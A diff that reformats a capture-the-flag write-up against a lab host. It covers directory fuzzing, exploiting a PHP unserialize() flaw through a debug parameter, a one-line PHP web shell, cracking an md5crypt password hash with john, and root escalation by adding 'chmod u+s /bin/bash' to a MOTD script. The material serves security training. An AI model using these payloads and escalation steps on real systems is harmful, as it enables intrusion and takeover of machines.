@@ -9,8 +9,8 @@
 
 | PORT | SERVICE |
 | :--- | :------ |
-| 22   | SSH     |
-| 80   | HTTP    |
+| 22 | SSH |
+| 80 | HTTP |
 
 
 
@@ -27,29 +27,29 @@ Source code is the default one too, we need to fuzz:
 ```
 ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.109.3/FUZZ" -ic -c -t 200
 
-        /'___\  /'___\           /'___\
-       /\ \__/ /\ \__/  __  __  /\ \__/
-       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
-        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
-         \ \_\   \ \_\  \ \____/  \ \_\
-          \/_/    \/_/   \/___/    \/_/
+ /'___\ /'___\ /'___\
+ /\ \__/ /\ \__/ __ __ /\ \__/
+ \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+ \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+ \ \_\ \ \_\ \ \____/ \ \_\
+ \/_/ \/_/ \/___/ \/_/
 
-       v2.1.0-dev
+ v2.1.0-dev
 ________________________________________________
 
- :: Method           : GET
- :: URL              : http://10.10.109.3/FUZZ
- :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Method : GET
+ :: URL : http://10.10.109.3/FUZZ
+ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
  :: Follow redirects : false
- :: Calibration      : false
- :: Timeout          : 10
- :: Threads          : 200
- :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Calibration : false
+ :: Timeout : 10
+ :: Threads : 200
+ :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
 ________________________________________________
 
-javascript              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 160ms]
-backup                  [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 157ms]
-grid                    [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 163ms]
+javascript [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 160ms]
+backup [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 157ms]
+grid [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 163ms]
 ```
 
 
@@ -65,11 +65,11 @@ We got the `index.php.bak` file, we can visualize the contents of it in order to
 
 This is highly vulnerable, due to this:
 
-- An attacker can craft a malicious serialized payload and pass it via theÂ `debug`Â GET parameter (e.g.,Â `?debug=PAYLOAD`).
-- TheÂ `unserialize()`Â function will reconstruct the object, triggering theÂ `__destruct()`Â method of theÂ `FormSubmit`Â class (or any other class if gadgets exist).
-- **Arbitrary File Write**: By controllingÂ `$form_file`Â andÂ `$message`, an attacker could:
-	- Overwrite critical files (e.g.,Â `.htaccess`,Â `index.php`).       
-	- Write a PHP web shell (e.g.,Â `<?php system($_GET['cmd']); ?>`) to gain RCE.
+- An attacker can craft a malicious serialized payload and pass it via the`debug` GET parameter (e.g.,`?debug=PAYLOAD`).
+- The`unserialize()` function will reconstruct the object, triggering the`__destruct()` method of the`FormSubmit` class (or any other class if gadgets exist).
+- **Arbitrary File Write**: By controlling`$form_file` and`$message`, an attacker could:
+	- Overwrite critical files (e.g.,`.htaccess`,`index.php`). 
+	- Write a PHP web shell (e.g.,`<?php system($_GET['cmd']); ?>`) to gain RCE.
 
 
 Knowing this, we can proceed to exploitation.
@@ -85,8 +85,8 @@ We can do the following:
 ```
 <?php
 class FormSubmit {
-    public $form_file;
-    public $message;
+ public $form_file;
+ public $message;
 }
 
 $payload = new FormSubmit();
@@ -170,7 +170,7 @@ echo 'james:$apr1$zPZMix2A$d8fBXH0em33bfI9UTt9Nq1' > hash.txt
 ```
 john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 
-jamaica          (james)
+jamaica (james)
 ```
 
 We got credentials, let's go into ssh:
@@ -226,24 +226,24 @@ chmod u+s /bin/bash
 cat /etc/update-motd.d/00-header
 #!/bin/sh
 #
-#    00-header - create the header of the MOTD
-#    Copyright (C) 2009-2010 Canonical Ltd.
+# 00-header - create the header of the MOTD
+# Copyright (C) 2009-2010 Canonical Ltd.
 #
-#    Authors: Dustin Kirkland <kirkland@canonical.com>
+# Authors: Dustin Kirkland <kirkland@canonical.com>
 #
-#    This program is free software; you can redistribute it and/or modify
-#    it under the terms of the GNU General Public License as published by
-#    the Free Software Foundation; either version 2 of the License, or
-#    (at your option) any later version.
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation; either version 2 of the License, or
+# (at your option) any later version.
 #
-#    This program is distributed in the hope that it will be useful,
-#    but WITHOUT ANY WARRANTY; without even the implied warranty of
-#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#    GNU General Public License for more details.
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
+# GNU General Public License for more details.
 #
-#    You should have received a copy of the GNU General Public License along
-#    with this program; if not, write to the Free Software Foundation, Inc.,
-#    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+# You should have received a copy of the GNU General Public License along
+# with this program; if not, write to the Free Software Foundation, Inc.,
+# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 
 chmod u+s /bin/bash
 ```
